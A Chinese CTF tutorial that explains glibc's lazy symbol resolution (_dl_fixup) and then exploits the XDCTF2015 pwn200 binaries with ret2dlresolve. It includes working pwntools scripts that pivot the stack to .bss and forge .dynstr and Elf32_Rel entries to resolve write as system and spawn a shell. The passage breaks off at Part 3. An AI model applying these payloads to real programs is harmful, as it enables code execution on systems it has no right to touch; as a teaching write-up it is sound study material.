# define D_PTR(map, i) ((map)->i->d_un.d_ptr + (map)->l_addr)
#else
# define D_PTR(map, i) (map)->i->d_un.d_ptr
#endif
=======================================================================================
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);   //rel_addr==0x8049730，地址是print函数对应的got地址		  
		//l->l_addr==0:该成员在第一个link_map结构体中为0，其余的都是代表各个动态链接库的基地址
		//reloc->r_offset：其取值是符号需要重定位的虚拟地址（即IDA中got表地址）
	    //l->l_addr + reloc->r_offset为.got.plt地址。
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);   //ELF_MACHINE_JMP_SLOT==0x7
//宏函数定义在：//glibc-2.27/elf/elf.h
//#define ELF32_R_TYPE(val)		((val) & 0xff)
```

在上面代码框的第10行中有assert断言，检查reloc->r_info的最低位是否为7:

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627645946624-113170c8-5efb-4f85-8eda-951aaaa24be4.png)

接下来有一个超大的if语句，结构如下：

```c
   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) //判断(sym->st_other)&0x03是否为0
    {
      ......
      }
  else //不为0
    {
       ......
    }
```

之前说过，st_other成员到现在为止的定义恒为0，所以0&0x03仍为0，此处一定会进入if语句，先来看第一部分：

```c
      const struct r_found_version *version = NULL; //初始化当前符号版本指针为NULL

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) //通过l_info来进行寻址
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);     //vernum==0x8048248
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff; //ndx==2
	  version = &l->l_versions[ndx];                                 //获取当前所解析符号的版本信息，version==0xf7fd0410
	  if (version->hash == 0)
	    version = NULL;
	}
=============================================================================
pwndbg> p/x *version
$22 = {
  name = 0x804822f, //*name=="GLIBC_2.0" 
  hash = 0xd696910, 
  hidden = 0x0, 
  filename = 0x80481fd //*filename=="libc.so.6"
}
pwndbg> 
```

上面的代码是搜索所解析符号的版本信息，在伪造结构体时可能会出现数组越界的情况访问到无效地址，这里暂且不谈。继续向下走，来到一个重点函数_dl_lookup_symbol_x：

```c
 ► 0xf7fe4fc3 <_dl_fixup+179>    call   _dl_lookup_symbol_x <_dl_lookup_symbol_x>
        arg[0]: 0x8048216 ◂— jo     0x804828a /* 'printf' */
        arg[1]: 0xf7ffd940 ◂— 0
        arg[2]: 0xffffcf24 —▸ 0x80481bc ◂— sbb    al, byte ptr [eax]
        arg[3]: 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fd03e0 —▸ 0xf7ffd940 ◂— 0
        arg[4]: 0xf7fd0410 —▸ 0x804822f ◂— inc    edi /* 'GLIBC_2.0' */
        arg[5]: 0x1
        arg[6]: 0x1
        arg[7]: 0x0
==========================================================================================
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL); //strtab+sym->st_name==0x8048216；
```

_dl_lookup_symbol_x的函数原型如下：

```c
//glibc-2.27/elf/dl-look.c
lookup_t
_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,
		     const ElfW(Sym) **ref,
		     struct r_scope_elem *symbol_scope[],
		     const struct r_found_version *version,
		     int type_class, int flags, struct link_map *skip_map)
```

> link_map定义在/glibc-2.27/include/link.h中
>

+ arg[0]：所要寻址符号的字符串指针（指针属于ELF String Table即.dynstr section）
+ arg[1]：传入_dl_fixup的链表指针，在这里指向链表的第一个结构体
+ arg[2]：sym是符号printf在.dynsym section中对应的Elf32_Sym指针，&sym是这个指针的所在地址
+ arg[3]：l->l_scope定义了要查找的符号所在link_map的范围，默认只向后查找3个结点（结构体）（r_nlist），开始查找的起点为r_list：

```c
//glibc-2.27/elf/dl-look.c
		  for (n = 0; n < scope->r_nlist; n++) 
		if (scope->r_list[n] == val.m)
		  break;
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627741771420-5a38be5e-eabe-4f3b-a253-18e086fcdb8e.png)

> **l->l_scope->r_list指向link_map结构体链表中第一个结点
>

+ arg[4]：此符号的版本信息（如果version->hash==0则version为NULL）
+ arg[5]：ELF_RTYPE_CLASS_PLT：宏定义在glibc-2.27/sysdeps/generic/ldsodefs.h中，默认值为1
+ arg[6]：无需知其作用
+ arg[7]：需要跳过的，不用搜索的link_map结构体指针

_dl_lookup_symbol_x是利用传入符号的字符串指针去查找对应的动态链接库；_dl_lookup_symbol_x的返回值result是一个link_map指针，其中result->l_addr为libc的基地址：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627729872063-74859362-88e4-4954-94dc-2254a13a8af8.png)

知道了libc的基地址后，继续查找printf的真实地址：

```c
      /* Currently result contains the base load address (or link map)
	 of the object that defines sym.  Now add in the symbol
	 offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
				   sym ? (LOOKUP_VALUE_ADDRESS (result)
					  + sym->st_value) : 0);   //将sym->st_value和LOOKUP_VALUE_ADDRESS(result)相加就是函数的真实地址：0xf7e2a430
//sym的st_value成员是所求符号的偏移地址：
//pwndbg> p/x *sym
//$15 = {
//  st_name = 0x551, 
//  st_value = 0x51430, 
//  st_size = 0x2a, 
//  st_info = 0x12, 
//  st_other = 0x0, 
//  st_shndx = 0xd
//}
//pwndbg> 
#LOOKUP_VALUE_ADDRESS的宏定义如下：
//glibc-2.27/sysdeps/generic/ldsodefs.h
#define LOOKUP_VALUE_ADDRESS(map) ((map) ? (map)->l_addr : 0) //可以看到LOOKUP_VALUE_ADDRESS(result)和result->l_addr等价
```

注意经过_dl_lookup_symbol_x的查询之后，sym和原来的sym含义不同，现在的sym是一个全新的指针变量，这个指针指向查询出来的printf Elf32_Sym结构体：

```c
pwndbg> p/x *sym
$20 = {
  st_name = 0x1a, 
  st_value = 0x0, 
  st_size = 0x0, 
  st_info = 0x12, 
  st_other = 0x0, 
  st_shndx = 0x0
}
pwndbg> p/x sym
$21 = 0x80481bc
pwndbg> p/x &sym #指针的地址不相同
$22 = 0xffffd2c4
====================================================================================
pwndbg> p/x *sym
$6 = {
  st_name = 0x21, 
  st_value = 0x12e30, 
  st_size = 0xca, 
  st_info = 0x12, 
  st_other = 0x0, 
  st_shndx = 0xc
}
pwndbg> p &sym
$7 = (const Elf32_Sym **) 0xffffcb64 #指针的地址不相同
pwndbg> p sym
$8 = (const Elf32_Sym *) 0xf7fd6414
pwndbg> 
```

如上所示，可以看到sym->st_value保存的是符号printf的偏移地址，加上libc基地址之后就是printf函数在内存中的真实地址，最终调用elf_machine_fixup_plt函数向此符号的got表中填写函数的真实地址即可：

```c
  /* And now perhaps the relocation addend.  */
  value = DL_FIXUP_MAKE_VALUE (l, reloc, value);

  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); 					  

  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;

  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);  //向符号的got表中填写函数的真实地址
}
```

_dl_fixup函数的所有源码如下：

```c

DL_FIXUP_VALUE_TYPE
attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE
_dl_fixup (
# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,
# endif
	   struct link_map *l, ElfW(Word) reloc_arg)
{
  const ElfW(Sym) *const symtab
    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);

  const PLTREL *const reloc
    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
  const ElfW(Sym) *refsym = sym;
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;

  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
    {
      const struct r_found_version *version = NULL;

      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
	{
	  const ElfW(Half) *vernum =
	    (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
	  version = &l->l_versions[ndx];
	  if (version->hash == 0)
	    version = NULL;
	}

      /* We need to keep the scope around so do some locking.  This is
	 not necessary for objects which cannot be unloaded or when
	 we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
	{
	  THREAD_GSCOPE_SET_FLAG ();
	  flags |= DL_LOOKUP_GSCOPE_LOCK;
	}

#ifdef RTLD_ENABLE_FOREIGN_CALL
      RTLD_ENABLE_FOREIGN_CALL;
#endif

      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL);

      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
	THREAD_GSCOPE_RESET_FLAG ();

#ifdef RTLD_FINALIZE_FOREIGN_CALL
      RTLD_FINALIZE_FOREIGN_CALL;
#endif

      /* Currently result contains the base load address (or link map)
	 of the object that defines sym.  Now add in the symbol
	 offset.  */
      value = DL_FIXUP_MAKE_VALUE (result,
				   sym ? (LOOKUP_VALUE_ADDRESS (result)
					  + sym->st_value) : 0);
    }
  else
    {
      /* We already found the symbol.  The module (and therefore its load
	 address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
      result = l;
    }

  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);

  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));

  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;

  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);
}
```

## 动态链接过程总结
1. 当调用某个属于动态链接库的函数时，进入call之后会来到.plt section的jmp汇编指令
2. 如果该函数不是第一次调用，则jmp之后会直接跳转到（jmp ptr）函数的真实地址执行该函数的汇编代码；如果函数是第一次调用，则jmp之后会来到.plt对应的push指令（存放代表该导入函数在.rel.plt（ELF JMPREL Relocation Table）中的偏移的参数reloc_arg）。
3. 执行push指令后会jmp到存放link_map结构体链表的第一个首结点的push指令，将link_map压入到stack中
4. 之后会跳转到_dl_runtime_resolve函数执行_dl_runtime_resolve(link_map,reloc_arg)
5. 在_dl_runtime_resolve中会调用函数_dl_fixup(link_map,reloc_arg)去寻找动态链接库在内存中的基地址和该符号的真实地址：
    - 因为第一个link_map的l_info成员中记录了_DYNAMIC节中每一个Elf32_Dyn的所在地址，所以可以通过对应的宏定义索引得到.dynsym（ELF Symbol Table）、.dynstr（ELF String Table）和.rel.plt（ELF JMPREL Relocation Table）的起始地址。
    - 然后会将.rel.plt的起始地址与传入_dl_fixup函数的reloc_offset（即reloc_arg）相加得到该符号的Elf32_Rel结构体的指针地址
    - 之后使用该符号的Elf32_Rel结构体r->info成员将(reloc->r_info)>>8的当作索引以搜寻该符号在ELF Symbol Table中的结构体Elf32_Sym地址
    - 第一个link_map结构体成员的l->l_addr始终为0，与Elf32_Rel结构体的reloc->r_offset成员相加就是该符号的.got.plt地址
    - 安全性检查：检查reloc->r_info成员的最低位是否是0x7，如果不是则触发assert断言。
    - 使用l_info[VERSYMIDX (DT_VERSYM)和vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff分别查找vernum、ndx，然后使用这两个结果查找（&l->l_versions[ndx]）当前所解析符号的版本信息：version（version可能为NULL）
    - 调用_dl_lookup_symbol_x查找符号所在动态链接库的link_map，这里使用了该符号对应的ELF String Table即.dynstr section的指针来进行查找，函数返回的result中的l->l_addr是动态链接库的基地址
    - 将sym->st_value（函数在动态链接库中的偏移）和l->addr相加就是所找符号的真实地址（DL_FIXUP_MAKE_VALUE）
    - 调用elf_machine_fixup_plt向符号的got表中填写函数的真实地址
    - 在_dl_runtime_resolve返回后调用该符号。<font style="background-color:#FADB14;"></font>

## 开始pwn
在开始pwn之前首先要了解在不同的RELRO的保护级别下三个section的读写权限：



|  | no-RELRO | Partial-RELRO | Full-RELRO |
| :---: | :---: | :---: | :---: |
| .dynamic | 可写 | 只读 | 只读 |
| .got.plt | 可写 | 可写 | 只读 |
| .got | 可写 | 只读 | 只读 |


RELRO保护：当程序使用动态链接的方式解析符号时，因为需要使用到.got.plt来进行解析，并且解析完之后要向其中回填函数的真实地址，所以说这个段中的内存是可以被修改的（.got.plt属于程序的data段，如下所示），因此我们需要一种保护机制防止.got.plt被篡改，这种保护机制就是RELRO（read only relocation）。

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627878269572-c2a7b0a6-0b1a-4b72-900a-62224c86fe71.png)

动态链接的过程中都是通过基地址+偏移进行寻址的，值得注意的是，dl_runtime_resolve并没有对参数的地址范围进行限制。接下来我们来看一下在不同保护级别下该如何pwn。

### NO RELRO
首先我们来看NO RELRO的情况：

> [https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32](https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32)
>

看一下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627793321071-2852db5c-2b5b-45c7-adf5-a78f183d4f03.png)

使用IDA打开之后发现有write函数和一个栈溢出函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627797997533-61026b63-9cba-4b90-9c93-100ca46b1c1c.png)

这里选择使用栈迁移到bss段然后再进行攻击，程序可用的gadget如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627880351274-42afee48-c84d-4bb5-ae9f-2756077246a2.png)

首先来捋一下思路：

+ 这道题的RELRO的保护是完全关闭的，是所以我们可以覆盖处于可写状态的.dynamic的DT_STRTAB的d_ptr（处于data段）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627881917724-5c8fc8c0-92ee-4670-88df-b0a4a1c61cbe.png)

+ 因为在解析函数的真实地址时会调用_dl_lookup_symbol_x函数，而传入的参数strtab + sym->st_name具有特异性，也就是它传入哪个符号的字符串指针就解析成为哪个函数。

```c
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
				    version, ELF_RTYPE_CLASS_PLT, flags, NULL); 
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627881948451-64a3a97f-b0f9-4dc0-9121-760f39c622f6.png)

+ 综上，我们可以在bss或栈上伪造一个ELF String Table（.dynstr section）（视情况将某个函数更改为system），然后覆盖对应的结构体指针为fake_dynstr；这样在动态链接的时候就会将该符号解析为system函数。

> leave指令相当于mov esp,ebp;pop ebp
>

首先迁移到bss段上：

```python
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_no_relro_32')
elf=ELF('./main_no_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804862b
leave_retn_gadget=0x0804851A #mov esp,ebp;pop ebp
three_pop_gadget=0x08048629
p.recvuntil('Welcome to XDCTF2015~!\n')

new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x500)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.sendline(payload1)
```

栈迁移主要的目标是将esp迁移到bss段上，ebp无所谓；迁移完成之后我们在new_stack_esp上写入read和fake_dynstr并且篡改strtab指针为我们伪造的fake_dynstr

> payload的生长方向为：从new_stack_esp到new_stack_ebp（从低地址到高地址）
>

```python
dynstr=elf.get_section_by_name('.dynstr').data()
fake_dynstr=dynstr.replace('write','system')
strtab = 0x08049808  #.dynamic节中strtab的地址
payload2 = p32(0xdeadbeef)+p32(read_plt)+p32(0x080483A6)+p32(0)+ p32(strtab)+p32(7)+fake_dynstr 
#p32(0xdeadbeef)用来抵消leave中的pop ebp的影响
# push 20h;jmp plt[0]
p.sendline(payload2)
payload3 = p32(bss_addr+0x300+24)+';sh'
```

正常情况下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627882306588-f3608778-805a-4129-b84a-e3d85b473255.png)

篡改后：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627882404751-4a45d8be-cbce-491b-bbb3-c2c893a7669f.png)

之后直接让其跳转到push reloc_arg去执行_dl_runtime_resolve重新解析write函数为system：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627882794069-d0f7a42f-d871-4ba3-a1b2-9e5537ca29b4.png)

最后：

```python
payload3 = p32(bss_addr+0x300+24)+';sh'
```

要想正确的调用system就必须有参数payload3的作用是篡改.dynsym结构体和传入sh参数；换句话说就是执行的是system(p32(bss_addr+0x300+24)+';sh')，但是system(p32(bss_addr+0x300+24))肯定会执行失败，于是就会执行system('sh')：

> 不懂的可以了解一下Linux命令行的分号'';控制符
>

总结：这道题主要是利用了NO RELRO的.dynamic section可写缺陷，从而getshell。

一点补充：为什么不能直接篡改ELF String Table中的write为system？

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627884694219-d1ac629b-5654-4958-a4a0-245e3041d4a5.png)

因为ELF String Table不可写，详情见前面的各个section权限。exp如下：

```python
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_no_relro_32')
elf=ELF('./main_no_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804862b
leave_retn_gadget=0x0804851A #mov esp,ebp;pop ebp
three_pop_gadget=0x08048629
p.recvuntil('Welcome to XDCTF2015~!\n')

new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x500)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.sendline(payload1)

'''
strtab_addr=0x0804824C #不可写
return_plt=0x080483A6
payload2=p32(read_plt)+p32(return_plt)+p32(read_arg1)+p32(strtab_addr)+p32(0x200) 
p.sendline(payload2)
p.sendline(fake_dynstr)
'''

dynstr=elf.get_section_by_name('.dynstr').data()
fake_dynstr=dynstr.replace('write','system')
strtab = 0x08049808 # .dynamic节中strtab的地址
payload2 = p32(0xdeadbeef)+p32(read_plt)+p32(0x080483A6)+p32(0)+ p32(strtab)+p32(7)+fake_dynstr
p.sendline(payload2)
#gdb.attach(p) #可以在这里下断点
payload3 = p32(bss_addr+0x300+24)+';sh'
p.send(payload3)
p.interactive()
```

> 另外，在脚本中下软件断点时极有可能会因为段错误无法getshell，这个原因可能与软件断点的本质有关：向内存中插入int3
>

### Partial RELRO
> [https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro)
>

接下来我们看一下如何应对开了Partial RELRO的程序，开了Partial-RELRO之后，因为.dynamic不再可写，所以不能再伪造.dynstr，只能另辟蹊径：

1⃣️在_dl_runtime_resolve函数解析的过程中并不会检查伪造的内容是否越界（大小范围进行限制），如reloc_arg，r_info，st_name

2⃣️解析的根源在于Elf32_Sym中的st_name成员

所以在Partial RELRO中的目标为篡改st_name为system。程序的保护如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627885106689-f94ae8cc-2e43-4c66-9c73-8e97f82d22a7.png)

程序的gadget如下所示：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627886051061-9800cacb-724f-4a17-8dbd-22f2a862f1c5.png)

为了方便理解，这里采用分步式讲解，也就是一步一步的进行伪造：这里拿write(1,&bin_sh_addr,len("/bin/sh\x00"))来举例；假若在每一步中write函数可以成功的打印出"/bin/sh\x00"，那么就意味着将write变为system之后稍加对参数更改就可以执行system("/bin/sh")。

#### Part1
在这一部分中，我们仍将栈迁移到bss上，通过payload的形式模拟参数reloc_arg压入到栈中的操作（push reloc_arg），然后直接控制程序流到jmp _dl_runtime_resolve，解析地址完成之后，程序将调用write函数打印出payload送入的/bin/sh\x00。

首先还是栈迁移，这里和之前的一样就不说了：

```python
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_partial_relro_32')
elf=ELF('./main_partial_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804864b
leave_retn_gadget=0x08048465 #mov esp,ebp;pop ebp
three_pop_gadget=0x08048649


new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x100)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)
```

迁移完成后劫持程序到jmp _dl_runtime_resolve处：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627905620142-7d2f8f1b-97c4-48af-8b59-3d5148dc6510.png)

回头看一下payload：

```python
payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(reloc_arg)+p32(0xdeadbeef) #第二个deadbeef是虚假的返回地址
payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string))
```

在payload2中我们模拟了在push link_map之前将reloc_arg压栈的操作：p32(reloc_arg)；这里可以想一下在进入某个如write等函数之前是先要将返回地址压栈的（call write），为了保持栈平衡，所以第二个p32(0xdeadbeef)的作用是当作虚假的返回地址，剩下的参数就好理解了，进入call之前将三个参数压入到栈中。打印参数的位置，可以使用如下方法确定：

```python
payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(reloc_arg)+p32(0xdeadbeef) #第二个deadbeef是虚假的返回地址
payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string))
gdb.attach(p)
p.sendline(payload2)
p.interactive()
```

运行脚本后可以单步步入到write的call   dword ptr gs:[0x10]中的sysenter进行查看：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627906388224-ff2bceb4-fb5b-479d-b766-c893432c6218.png)

所以完整的payload如下：

```python
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_partial_relro_32')
elf=ELF('./main_partial_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804864b
leave_retn_gadget=0x08048465 #mov esp,ebp;pop ebp
three_pop_gadget=0x08048649


new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x100)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)

reloc_arg=0x20
jmp_to_dl_runtime_resolve_addr=0x08048370
string="/bin/sh\x00"

payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(reloc_arg)+p32(0xdeadbeef) #第二个deadbeef是虚假的返回地址
payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string))
payload2+='a'*52+string+'a'*12

#gdb.attach(p)
p.sendline(payload2)
p.interactive()
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627906517968-2bec2a0a-1c92-4641-acf9-67c08527c1ff.png)

#### Part2
这一部分我们就要利用到之前学到的知识了，再此之前我们来再次稍微总结一下上一小步做了什么：在发生栈迁移后，通过read函数在bss段上读入了含有reloc_arg的payload，然后让程序流跳转到了_dl_runtime_resolve，因为在解析动态链接库时reloc_arg具有特异性，所以解析的结果为write函数，从而调用该函数打印出特定的字符串。在part2中要进一步：在stack上伪造write函数的Elf32_Rel结构体，从而调用write函数打印"/bin/sh\x00"；这里还是和之前一模一样的栈迁移：

```python
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_partial_relro_32')
elf=ELF('./main_partial_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804864b
leave_retn_gadget=0x08048465 #mov esp,ebp;pop ebp
three_pop_gadget=0x08048649


new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x100)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)
```

因为参数reloc_arg代表的是write在.rel.plt（ELF JMPREL Relocation Table）中的偏移，即：

```python
reloc_arg==write_Elf32_Rel_addr-rel_plt_start_addr
```

所以在part1的exp中可以将变量reloc_arg替换为fake_reloc_arg：fake_write_Elf32_Rel_addr-rel_plt_start_addr，即：

```python
fake_reloc_arg=fake_write_Elf32_Rel_addr-rel_plt_start_addr
```

> 注：fake_write_Elf32_Rel_addr是伪造的write函数的Elf32_Rel结构体地址，稍后会说到。
>

要在栈上伪造一个fake_write_Elf32_Rel结构体得伪造两项内容：r_offset和r_info；其中r_offset就是write的.got.plt地址，r_info可以在IDA中看得到，直接复制下来就行了：

```c
fake_reloc_r_offset=elf.got['write']  
fake_reloc_r_info=0x607
fake_write_Elf32_Rel=p32(fake_reloc_r_offset)+p32(fake_reloc_r_info) #伪造write的Elf32_Rel结构体
```

> 成员r_offset和r_info分别占4字节也就是p32，详情参考文章前半部分内容
>

所以完整的payload如下：

```c
#coding=utf-8
from pwn import *
context.log_level="debug"

p=process('./main_partial_relro_32')
elf=ELF('./main_partial_relro_32')
bss_addr=elf.bss()
read_plt=elf.plt['read']
write_plt=elf.plt['write']

pop_ebp_gadget=0x0804864b
leave_retn_gadget=0x08048465 #mov esp,ebp;pop ebp
three_pop_gadget=0x08048649


new_stack_esp=bss_addr+0x300
new_stack_ebp=bss_addr+0x500
payload1='a'*112+p32(read_plt)+p32(three_pop_gadget)+p32(0)+p32(bss_addr+0x300)+p32(0x100)#esp低地址；ebp高地址
payload1+=p32(pop_ebp_gadget)+p32(new_stack_esp)+p32(leave_retn_gadget) #eip->bss
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)

#reloc_arg=0x20
#jmp_to_dl_runtime_resolve_addr=0x08048370
#string="/bin/sh\x00"

#payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(reloc_arg)+p32(0xdeadbeef) #第二个deadbeef是虚假的返回地址
#payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string))
#payload2+='a'*52+string+'a'*12

jmp_to_dl_runtime_resolve_addr=0x08048370
string="/bin/sh\x00"

fake_write_Elf32_Rel_addr=new_stack_esp+4*7 #一个p32占四字节，执行leave中的pop ebp后开始计算
                                  #fake_write_addr指fake_write_Elf32_Rel的地址
rel_plt_start_addr=0x8048324
fake_reloc_arg=fake_write_Elf32_Rel_addr-rel_plt_start_addr

fake_reloc_r_offset=elf.got['write']  
fake_reloc_r_info=0x607
fake_write_Elf32_Rel=p32(fake_reloc_r_offset)+p32(fake_reloc_r_info) #伪造write的Elf32_Rel结构体

payload2=p32(0xdeadbeef)+p32(jmp_to_dl_runtime_resolve_addr)+p32(fake_reloc_arg)+p32(0xdeadbeef)
payload2+=p32(1)+p32(bss_addr+0x300+80)+p32(len(string))
payload2+=fake_write_Elf32_Rel #new
payload2+='a'*44+string+'a'*12 #注意把这里的偏移改一下，因为加了一个fake_write_Elf32_Rel
#gdb.attach(p)
p.sendline(payload2)
p.interactive()
```

Q：相较于part1增加了什么？

A：在栈上伪造了一个Elf32_Rel结构体

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1627917859476-1c8dfbab-8109-40d4-875c-d34590f31152.png)

#### Part3
在这一部分中，我们将在part2中的fake_reloc_r_info进行再次拆分，从而伪造该符号的Elf32_Sym结构体，进而控制传入_dl_lookup_symbol_x函数的参数st->name，在这一小步中，先来实现伪造Elf32_Sym的目标。

> Q：为什么要对fake_reloc_r_info进行再次拆分？
>
> A：因为在这个例子中write函数在程序中原本存在有，所以说其各个结构体都是已知的；但如果要拿到shell的话需要将本例中的write函数替换成system，并且system不是在每个程序中都有的（几乎没有），也就是说其各个结构体都是未知的，想要调用system得进一步向下伪造（与之前动态链接的过程相结合）。
>

首先还是栈迁移，这里就不再复制了，这里我们再回顾一下动态链接过程中解析Elf32_Sym的过程：

